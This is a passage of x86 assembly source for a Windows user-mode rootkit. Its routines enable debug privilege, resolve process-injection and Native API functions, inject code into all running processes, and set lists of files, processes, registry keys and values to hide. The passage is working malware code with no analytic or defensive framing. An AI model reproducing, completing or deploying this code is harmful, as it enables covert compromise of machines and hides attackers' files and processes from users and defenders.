  mov	   eax, [esp + 0Ch]
  mov	   [esp + 1Ch], eax
  mov	   dword [esp + 20h], 2
  lea	   eax, [esp + 10h]
  push	   eax
  lea	   eax, [esp + 18h]
  push	   eax
  push	   10h
  lea	   eax, [esp + 20h]
  push	   eax
  push	   0
  mov	   eax, [esp + 14h]
  push	   eax
  call	   [AdjustTokenPrivileges]
  mov	   esp, ebp
@@:
  add	   esp, 14h
  ret


InitRootkit:
  pushad
  push	   0
  push	   'oRk'
  push	   'Micr'
  mov	   ebx, esp
  mov	   eax, [VirtualAllocEx]
  mov	   [InjData.pVirtualAllocEx], eax
  mov	   eax, [WriteProcessMemory]
  mov	   [InjData.pWriteProcessMemory], eax
  mov	   eax, [CreateRemoteThread]
  mov	   [InjData.pCreateRemoteThread], eax
  mov	   [InjData.InjSize], InjectSize
  mov	   eax, [VirtualProtect]
  mov	   [InjData.pVirtualProtect], eax
  mov	   eax, [ZwQueryDirectoryFile]
  mov	   [InjData.pZwQueryDirectoryFile], eax
  mov	   eax, [wcsnicmp]
  mov	   [InjData.pWcsnicmp], eax
  mov	   eax, [ZwQuerySystemInformation]
  mov	   [InjData.pZwQuerySystemInformation], eax
  mov	   eax, [ZwEnumerateValueKey]
  mov	   [InjData.pZwEnumerateValueKey], eax
  mov	   eax, [wcsncpy]
  mov	   [InjData.pWcsncpy], eax
  mov	   eax, [ZwClose]
  mov	   [InjData.pZwClose], eax
  mov	   eax, [ZwOpenKey]
  mov	   [InjData.pZwOpenKey], eax
  mov	   eax, [ZwEnumerateKey]
  mov	   [InjData.pZwEnumerateKey], eax
  mov	   eax, [RtlInitUnicodeString]
  mov	   [InjData.pRtlInitUnicodeString], eax
  mov	   eax, [MapViewOfFile]
  mov	   [InjData.pMapViewOfFile], eax
  mov	   eax, [ReadProcessMemory]
  mov	   [InjData.pReadProcessMemory], eax
  mov	   eax, [ZwCreateThread]
  mov	   [InjData.pZwCreateThread], eax
  mov	   eax, [DuplicateHandle]
  mov	   [InjData.pDuplicateHandle], eax
  mov	   eax, [GetModuleFileNameW]
  mov	   [InjData.pGetModuleFileNameW], eax
  push	   ebx
  push	   sizeof.SET_DATA
  push	   0
  push	   PAGE_READWRITE
  push	   0
  push	  -1
  call	   [CreateFileMapping]
  test	   eax, eax
  jz	   @F
  mov	   [hMapping], eax
  push	   0
  push	   0
  push	   0
  push	   FILE_MAP_READ + FILE_MAP_WRITE
  push	   eax
  call	   [MapViewOfFile]
  test	   eax, eax
  jz	   @F
  mov	   [pSetData], eax
  mov	   edi, eax
  xor	   eax, eax
  mov	   ecx, sizeof.SET_DATA / 4
  rep stosd
  call	   EnableDebugPrivilege
  call	   InjectToAll
@@:
  add	   esp, 0Ch
  popad
  ret

SetHidden: ; Files, Processes, RegKeys, RegValues, TrueProcesses
  push	   ebp
  mov	   ebp, esp
  pushad
  mov	   edi, [pSetData]
  mov	   eax, [ebp + 8]
  push	   100h
  push	   eax
  lea	   eax, [edi + SET_DATA.HiddenFiles]
  push	   eax
  call	   [mbstowcs]
  add	   esp, 0Ch
  mov	   eax, [ebp + 0Ch]
  push	   100h
  push	   eax
  lea	   eax, [edi + SET_DATA.HiddenProcesses]
  push	   eax
  call	   [mbstowcs]
  add	   esp, 0Ch
  mov	   eax, [ebp + 14h]
  push	   100h
  push	   eax
  lea	   eax, [edi + SET_DATA.HiddenValues]
  push	   eax
  call	   [mbstowcs]
  add	   esp, 0Ch
  mov	   eax, [ebp + 18h]
  push	   100h
  push	   eax
  lea	   eax, [edi + SET_DATA.TrueProcesses]
  push	   eax
  call	   [mbstowcs]
  add	   esp, 0Ch
  mov	   [edi + SET_DATA.HiddenKeysCount], 0
  mov	   eax, [ebp + 10h]
  push	   100h
  push	   eax
  lea	   eax, [edi + SET_DATA.HiddenKeysData]
  push	   eax
  call	   [mbstowcs]
  add	   esp, 0Ch
  call	   ProcessHiddenKeys
  popad
  leave
  retn	   14h
